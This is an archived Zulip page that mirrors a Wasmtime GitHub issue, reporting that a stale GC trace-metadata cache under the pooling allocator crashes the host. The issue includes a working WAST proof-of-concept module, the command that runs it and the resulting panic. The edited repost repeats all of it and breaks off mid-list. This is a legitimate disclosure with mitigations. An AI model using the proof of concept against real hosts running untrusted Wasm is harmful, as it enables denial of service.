@@ -1,0 +1,385 @@
+<html>
+<head><meta charset="utf-8"><title>wasmtime / issue #13417 `trace_info` stale cache can lead... · git-wasmtime · Zulip Chat Archive</title></head>
+<h2>Stream: <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/index.html">git-wasmtime</a></h2>
+<h3>Topic: <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html">wasmtime / issue #13417 `trace_info` stale cache can lead...</a></h3>
+
+<hr>
+
+<base href="https://bytecodealliance.zulipchat.com">
+
+<head><link href="https://bytecodealliance.github.io/zulip-archive/style.css" rel="stylesheet"></head>
+
+<a name="596349731"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596349731" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596349731">(May 20 2026 at 05:28)</a>:</h4>
+<p>qwaz opened <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">issue #13417</a>:</p>
+<blockquote>
+<p>This bug is reachable only when Wasmtime runs Wasm GC with the pooling allocator enabled. <a href="https://docs.wasmtime.dev/security-what-is-considered-a-security-vulnerability.html">Wasmtime's security page</a> says "Bugs must affect <a href="https://docs.wasmtime.dev/stability-tiers.html">a tier 1 platform or feature</a> to be considered a security vulnerability." Since <code>gc</code> is marked tier 2, we are directly reporting this bug on GitHub.</p>
+<h2>Overview</h2>
+<p><code>DrcHeap</code> caches GC tracing metadata in <code>trace_infos</code>, keyed by <code>VMSharedTypeIndex</code>. When a pooled DRC heap is detached, it intentionally preserves that cache because the heap will only be reused with the same <code>Engine</code> (described in code comment). However, the same-engine assumption is not sufficient: when a module's <code>TypeCollection</code> is dropped, Wasmtime unregisters its rec groups and returns their shared type-index slab entries to the registry. A later module on the same <code>Engine</code> can then assign the same <code>VMSharedTypeIndex</code> to a different GC type. If that happens, <code>DrcHeap::ensure_trace_info</code> sees the stale cache entry and does not rebuild the tracing metadata for the new layout.</p>
+<p>DRC relies on this metadata while tracing outgoing references before deallocating an object whose reference count reached zero. Reusing metadata from an older, larger struct for a newer, smaller struct breaks the invariant that cached GC-reference offsets describe the current type bound to the shared index. The current implementation detects the mismatch when <code>VMGcObjectData::read_pod</code> reads beyond the new object's data and panics with <code>out of bounds field</code>, aborting the host process. This demonstrates an execution-time denial of service with the default DRC collector; it does not demonstrate host memory unsafety or sandbox escape.</p>
+<h3>Security impact</h3>
+<p>This bug only affects targets with GC and the pooling allocator enabled that execute untrusted programs. A quick GitHub search didn't reveal any important targets that operate on this configuration.</p>
+<h3>Demonstration</h3>
+<p>Run:</p>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>wasmtime<span class="w"> </span>wast<span class="w"> </span>-W<span class="w"> </span><span class="nv">gc</span><span class="o">=</span>y<span class="w"> </span>-O<span class="w"> </span>pooling-allocator<span class="o">=</span>y<span class="w"> </span>poc.wast
+</code></pre></div>
+<div class="codehilite" data-code-language="WebAssembly"><pre><span></span><code><span class="c1">;; This PoC is intended for the `wasmtime wast` CLI. The `thread` directive is</span>
+<span class="c1">;; a WAST-harness directive that creates a second Store on the same Engine.</span>
+
+<span class="p">(</span><span class="k">module</span><span class="p">)</span>
+
+<span class="p">(</span><span class="err">thread</span> <span class="nv">$old</span>
+  <span class="p">(</span><span class="k">module</span>
+    <span class="c1">;; Register stale trace metadata for a large struct whose final field is a</span>
+    <span class="c1">;; GC reference. The field offset is valid for this type, but not for the</span>
+    <span class="c1">;; smaller type instantiated after this thread's Store is dropped.</span>
+    <span class="p">(</span><span class="k">type</span> <span class="nv">$old</span> <span class="p">(</span><span class="err">struct</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="err">anyref</span><span class="p">)))</span>
+    <span class="p">(</span><span class="k">global</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$old</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$old</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="err">ref.null</span> <span class="err">any</span><span class="p">)))))</span>
+<span class="p">(</span><span class="err">wait</span> <span class="nv">$old</span><span class="p">)</span>
+
+<span class="p">(</span><span class="k">module</span>
+  <span class="p">(</span><span class="k">type</span> <span class="nv">$new</span> <span class="p">(</span><span class="err">struct</span> <span class="p">(</span><span class="err">field</span> <span class="p">(</span><span class="k">mut</span> <span class="kt">i32</span><span class="p">))))</span>
+  <span class="p">(</span><span class="k">global</span> <span class="nv">$g</span> <span class="p">(</span><span class="k">mut</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$new</span><span class="p">))</span>
+    <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$new</span> <span class="p">(</span><span class="nb">i32.const</span> <span class="mi">1</span><span class="p">)))</span>
+  <span class="p">(</span><span class="k">func</span> <span class="p">(</span><span class="k">export</span> <span class="s2">"trigger"</span><span class="p">)</span>
+    <span class="c1">;; Overwriting the global makes DRC decrement and deallocate the old value,</span>
+    <span class="c1">;; consuming the stale trace metadata without forcing an explicit GC.</span>
+    <span class="p">(</span><span class="nb">global.set</span> <span class="nv">$g</span> <span class="p">(</span><span class="err">ref.null</span> <span class="nv">$new</span><span class="p">))))</span>
+
+<span class="p">(</span><span class="err">invoke</span> <span class="s2">"trigger"</span><span class="p">)</span>
+</code></pre></div>
+<p>The first WAST <code>thread</code> directive is a PoC mechanism, not a requirement for triggering the bug. It was used for creating a child <code>Store</code> on the same <code>Engine</code>, but there are other ways to build a similar construct. When the threat executes, DRC registers trace metadata for the type in the child store's pooled heap. When <code>(wait $old)</code> completes, the child store is dropped and the pooled DRC heap is returned with its <code>trace_infos</code> map intact.</p>
+<p>The second module instantiates after the child store has been dropped. Its small scalar-only struct receives the recycled <code>VMSharedTypeIndex</code>, and the main store reuses the pooled DRC heap. The trigger overwrites a mutable global that holds the new object, so DRC decrements and deallocates the old global value. During deallocation, the stale large-type GC-reference field offset is read from the small object's data via <code>VMGcObjectData::read_u32</code>, which panics with <code>out of bounds field</code>.</p>
+<h4>Output</h4>
+<div class="codehilite" data-code-language="Text only"><pre><span></span><code>$ wasmtime wast -W gc=y -O pooling-allocator=y poc.wast
+
+thread 'main' (2176) panicked at crates/wasmtime/src/runtime/vm/gc/enabled/data.rs:137:48:
+out of bounds field
+note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+zsh: IOT instruction (core dumped)  wasmtime wast -W gc=y -O pooling-allocator=y
+</code></pre></div>
+<h4>Environment</h4>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>$<span class="w"> </span>lsb_release<span class="w"> </span>-a
+Distributor<span class="w"> </span>ID:<span class="w"> </span>Ubuntu
+Description:<span class="w">    </span>Ubuntu<span class="w"> </span><span class="m">26</span>.04<span class="w"> </span>LTS
+Release:<span class="w">        </span><span class="m">26</span>.04
+Codename:<span class="w">       </span>resolute
+
+$<span class="w"> </span>wasmtime<span class="w"> </span>--version
+wasmtime<span class="w"> </span><span class="m">44</span>.0.1<span class="w"> </span><span class="o">(</span>f302ebd6b<span class="w"> </span><span class="m">2026</span>-04-30<span class="o">)</span>
+</code></pre></div>
+<h3>Data flow trace</h3>
+<p><strong>Bug path: stale trace metadata survives pooled-heap reuse</strong></p>
+<p><code>DrcHeap::ensure_trace_info</code> / <code>DrcHeap::insert_new_trace_info</code> → <code>DrcHeap::detach</code></p>
+<ul>
+<li>
+<p><code>DrcHeap::ensure_trace_info</code> returns immediately on a <code>VMSharedTypeIndex</code> cache hit. On a miss, <code>DrcHeap::insert_new_trace_info</code> reads the current GC layout from the engine and stores struct GC-reference offsets under that index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309</a></p>
+</li>
+<li>
+<p><code>DrcHeap::detach</code> preserves <code>trace_infos</code> when a pooled heap is detached for reuse. The comment assumes same-engine reuse means the tracing information remains valid.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811</a></p>
+</li>
+</ul>
+<p><strong>Bug path: the type registry can recycle the cache key</strong></p>
+<p><code>TypeCollection::drop</code> → <code>TypeRegistryInner::unregister_type_collection</code> → <code>TypeRegistryInner::remove_entry_impl</code> → <code>TypeRegistryInner::remove_entry_types</code> / <code>Slab::dealloc</code> → <code>TypeRegistryInner::assign_shared_type_indices</code> / <code>Slab::alloc</code></p>
+<ul>
+<li>
+<p>Dropping a <code>TypeCollection</code> unregisters its rec groups. When a rec group's registration count reaches zero, the registry removes the entry and deallocates each shared type-index slab entry.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940</a></p>
+</li>
+<li>
+<p>Later type registration obtains <code>VMSharedTypeIndex</code> values from the same slab. <code>Slab::try_alloc_index</code> prefers the free list, so a newly registered, different GC type can receive the old index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455</a></p>
+</li>
+</ul>
+<h3>Recommendation</h3>
+<p>Possible mitigations for this specific pattern include:</p>
+<ol>
+<li>Clear or invalidate DRC <code>trace_infos</code> when a pooled heap is detached or reassigned.</li>
+<li>Key cached trace metadata by a non-recycled type identity, not only <code>VMSharedTypeIndex</code>.</li>
+<li>Revalidate cached entries in <code>ensure_trace_info</code> against the current <code>TypeRegistry</code> layout before reuse.</li>
+</ol>
+<p>Any change should preserve intended same-engine heap reuse while preventing stale metadata from surviving type-index recycling.</p>
+<hr>
+<p>The initial discovery was made by AI. All technical claims have been reviewed and revised by human experts.</p>
+<p>Reporting on behalf of Autonomous Code Security (ACS) team at Microsoft.<br>
+</p>
+</blockquote>
+
+
+
+<a name="596349732"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596349732" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596349732">(May 20 2026 at 05:28)</a>:</h4>
+<p><a href="https://github.com/qwaz">qwaz</a> added the bug label to <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">Issue #13417</a>.</p>
+
+
+
+<a name="596349823"></a>
+<h4><a href="https://bytecodealliance.zulipchat.com#narrow/stream/225357-git-wasmtime/topic/wasmtime%20/%20issue%20%2313417%20%60trace_info%60%20stale%20cache%20can%20lead.../near/596349823" class="zl"><img src="https://bytecodealliance.github.io/zulip-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Wasmtime GitHub notifications bot <a href="https://bytecodealliance.github.io/zulip-archive/stream/225357-git-wasmtime/topic/wasmtime.20.2F.20issue.20.2313417.20.60trace_info.60.20stale.20cache.20can.20lead.2E.2E.2E.html#596349823">(May 20 2026 at 05:29)</a>:</h4>
+<p>qwaz edited <a href="https://github.com/bytecodealliance/wasmtime/issues/13417">issue #13417</a>:</p>
+<blockquote>
+<p>This bug is reachable only when Wasmtime runs Wasm GC with the pooling allocator enabled. <a href="https://docs.wasmtime.dev/security-what-is-considered-a-security-vulnerability.html">Wasmtime's security page</a> says "Bugs must affect <a href="https://docs.wasmtime.dev/stability-tiers.html">a tier 1 platform or feature</a> to be considered a security vulnerability." Since <code>gc</code> is marked tier 2, we are directly reporting this bug on GitHub.</p>
+<h2>Overview</h2>
+<p><code>DrcHeap</code> caches GC tracing metadata in <code>trace_infos</code>, keyed by <code>VMSharedTypeIndex</code>. When a pooled DRC heap is detached, it intentionally preserves that cache because the heap will only be reused with the same <code>Engine</code> (described in code comment). However, the same-engine assumption is not sufficient: when a module's <code>TypeCollection</code> is dropped, Wasmtime unregisters its rec groups and returns their shared type-index slab entries to the registry. A later module on the same <code>Engine</code> can then assign the same <code>VMSharedTypeIndex</code> to a different GC type. If that happens, <code>DrcHeap::ensure_trace_info</code> sees the stale cache entry and does not rebuild the tracing metadata for the new layout.</p>
+<p>DRC relies on this metadata while tracing outgoing references before deallocating an object whose reference count reached zero. Reusing metadata from an older, larger struct for a newer, smaller struct breaks the invariant that cached GC-reference offsets describe the current type bound to the shared index. The current implementation detects the mismatch when <code>VMGcObjectData::read_pod</code> reads beyond the new object's data and panics with <code>out of bounds field</code>, aborting the host process. This demonstrates an execution-time denial of service with the default DRC collector; it does not demonstrate host memory unsafety or sandbox escape.</p>
+<h3>Security impact</h3>
+<p>This bug only affects targets with GC and the pooling allocator enabled that execute untrusted programs. A quick GitHub search didn't reveal any important targets that operate on this configuration.</p>
+<h3>Demonstration</h3>
+<p>Run:</p>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>wasmtime<span class="w"> </span>wast<span class="w"> </span>-W<span class="w"> </span><span class="nv">gc</span><span class="o">=</span>y<span class="w"> </span>-O<span class="w"> </span>pooling-allocator<span class="o">=</span>y<span class="w"> </span>poc.wast
+</code></pre></div>
+<div class="codehilite" data-code-language="WebAssembly"><pre><span></span><code><span class="c1">;; This PoC is intended for the `wasmtime wast` CLI. The `thread` directive is</span>
+<span class="c1">;; a WAST-harness directive that creates a second Store on the same Engine.</span>
+
+<span class="p">(</span><span class="k">module</span><span class="p">)</span>
+
+<span class="p">(</span><span class="err">thread</span> <span class="nv">$old</span>
+  <span class="p">(</span><span class="k">module</span>
+    <span class="c1">;; Register stale trace metadata for a large struct whose final field is a</span>
+    <span class="c1">;; GC reference. The field offset is valid for this type, but not for the</span>
+    <span class="c1">;; smaller type instantiated after this thread's Store is dropped.</span>
+    <span class="p">(</span><span class="k">type</span> <span class="nv">$old</span> <span class="p">(</span><span class="err">struct</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span> <span class="p">(</span><span class="err">field</span> <span class="kt">i64</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">field</span> <span class="err">anyref</span><span class="p">)))</span>
+    <span class="p">(</span><span class="k">global</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$old</span><span class="p">)</span>
+      <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$old</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span> <span class="p">(</span><span class="nb">i64.const</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">(</span><span class="err">ref.null</span> <span class="err">any</span><span class="p">)))))</span>
+<span class="p">(</span><span class="err">wait</span> <span class="nv">$old</span><span class="p">)</span>
+
+<span class="p">(</span><span class="k">module</span>
+  <span class="p">(</span><span class="k">type</span> <span class="nv">$new</span> <span class="p">(</span><span class="err">struct</span> <span class="p">(</span><span class="err">field</span> <span class="p">(</span><span class="k">mut</span> <span class="kt">i32</span><span class="p">))))</span>
+  <span class="p">(</span><span class="k">global</span> <span class="nv">$g</span> <span class="p">(</span><span class="k">mut</span> <span class="p">(</span><span class="err">ref</span> <span class="err">null</span> <span class="nv">$new</span><span class="p">))</span>
+    <span class="p">(</span><span class="err">struct.new</span> <span class="nv">$new</span> <span class="p">(</span><span class="nb">i32.const</span> <span class="mi">1</span><span class="p">)))</span>
+  <span class="p">(</span><span class="k">func</span> <span class="p">(</span><span class="k">export</span> <span class="s2">"trigger"</span><span class="p">)</span>
+    <span class="c1">;; Overwriting the global makes DRC decrement and deallocate the old value,</span>
+    <span class="c1">;; consuming the stale trace metadata without forcing an explicit GC.</span>
+    <span class="p">(</span><span class="nb">global.set</span> <span class="nv">$g</span> <span class="p">(</span><span class="err">ref.null</span> <span class="nv">$new</span><span class="p">))))</span>
+
+<span class="p">(</span><span class="err">invoke</span> <span class="s2">"trigger"</span><span class="p">)</span>
+</code></pre></div>
+<p>The first WAST <code>thread</code> directive is a PoC mechanism, not a requirement for triggering the bug. It was used for creating a child <code>Store</code> on the same <code>Engine</code>, but there are other ways to build a similar construct. When the thread executes, DRC registers trace metadata for the type in the child store's pooled heap. When <code>(wait $old)</code> completes, the child store is dropped and the pooled DRC heap is returned with its <code>trace_infos</code> map intact.</p>
+<p>The second module instantiates after the child store has been dropped. Its small scalar-only struct receives the recycled <code>VMSharedTypeIndex</code>, and the main store reuses the pooled DRC heap. The trigger overwrites a mutable global that holds the new object, so DRC decrements and deallocates the old global value. During deallocation, the stale large-type GC-reference field offset is read from the small object's data via <code>VMGcObjectData::read_u32</code>, which panics with <code>out of bounds field</code>.</p>
+<h4>Output</h4>
+<div class="codehilite" data-code-language="Text only"><pre><span></span><code>$ wasmtime wast -W gc=y -O pooling-allocator=y poc.wast
+
+thread 'main' (2176) panicked at crates/wasmtime/src/runtime/vm/gc/enabled/data.rs:137:48:
+out of bounds field
+note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
+zsh: IOT instruction (core dumped)  wasmtime wast -W gc=y -O pooling-allocator=y
+</code></pre></div>
+<h4>Environment</h4>
+<div class="codehilite" data-code-language="Bash"><pre><span></span><code>$<span class="w"> </span>lsb_release<span class="w"> </span>-a
+Distributor<span class="w"> </span>ID:<span class="w"> </span>Ubuntu
+Description:<span class="w">    </span>Ubuntu<span class="w"> </span><span class="m">26</span>.04<span class="w"> </span>LTS
+Release:<span class="w">        </span><span class="m">26</span>.04
+Codename:<span class="w">       </span>resolute
+
+$<span class="w"> </span>wasmtime<span class="w"> </span>--version
+wasmtime<span class="w"> </span><span class="m">44</span>.0.1<span class="w"> </span><span class="o">(</span>f302ebd6b<span class="w"> </span><span class="m">2026</span>-04-30<span class="o">)</span>
+</code></pre></div>
+<h3>Data flow trace</h3>
+<p><strong>Bug path: stale trace metadata survives pooled-heap reuse</strong></p>
+<p><code>DrcHeap::ensure_trace_info</code> / <code>DrcHeap::insert_new_trace_info</code> → <code>DrcHeap::detach</code></p>
+<ul>
+<li>
+<p><code>DrcHeap::ensure_trace_info</code> returns immediately on a <code>VMSharedTypeIndex</code> cache hit. On a miss, <code>DrcHeap::insert_new_trace_info</code> reads the current GC layout from the engine and stores struct GC-reference offsets under that index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L271-L309</a></p>
+</li>
+<li>
+<p><code>DrcHeap::detach</code> preserves <code>trace_infos</code> when a pooled heap is detached for reuse. The comment assumes same-engine reuse means the tracing information remains valid.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/vm/gc/enabled/drc.rs#L786-L811</a></p>
+</li>
+</ul>
+<p><strong>Bug path: the type registry can recycle the cache key</strong></p>
+<p><code>TypeCollection::drop</code> → <code>TypeRegistryInner::unregister_type_collection</code> → <code>TypeRegistryInner::remove_entry_impl</code> → <code>TypeRegistryInner::remove_entry_types</code> / <code>Slab::dealloc</code> → <code>TypeRegistryInner::assign_shared_type_indices</code> / <code>Slab::alloc</code></p>
+<ul>
+<li>
+<p>Dropping a <code>TypeCollection</code> unregisters its rec groups. When a rec group's registration count reaches zero, the registry removes the entry and deallocates each shared type-index slab entry.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L215-L225</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1361-L1370</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L933-L940</a></p>
+</li>
+<li>
+<p>Later type registration obtains <code>VMSharedTypeIndex</code> values from the same slab. <code>Slab::try_alloc_index</code> prefers the free list, so a newly registered, different GC type can receive the old index.</p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/wasmtime/src/runtime/type_registry.rs#L1169-L1176</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L328-L337</a></p>
+<p><a href="https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455">https://github.com/bytecodealliance/wasmtime/blob/f302ebd6be3b452eff175f8af6ae792b1d703330/crates/core/src/slab.rs#L439-L455</a></p>
+</li>
+</ul>
+<h3>Recommendation</h3>
+<p>Possible mitigations for this specific pattern include:</p>
+<ol>
+<li>Clear or invalidate DRC <code>trace_infos</code> when a pooled heap is detached or reassigned.</li>
